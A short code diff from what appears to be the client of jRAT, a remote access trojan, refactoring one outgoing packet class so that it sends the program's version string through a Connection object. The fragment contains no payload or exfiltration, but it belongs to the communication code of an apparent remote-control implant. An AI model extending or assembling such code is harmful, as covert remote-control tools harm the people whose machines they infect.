@@ -1,15 +1,14 @@
 package jrat.client.packets.outgoing;
 
+import jrat.client.Connection;
 import jrat.common.Version;
-import jrat.common.io.StringWriter;
-import java.io.DataOutputStream;
 
 
 public class Packet6InitVersion extends AbstractOutgoingPacket {
 
 	@Override
-	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		sw.writeLine(Version.getVersion());
+	public void write(Connection con) throws Exception {
+		con.writeLine(Version.getVersion());
 	}
 
 	@Override
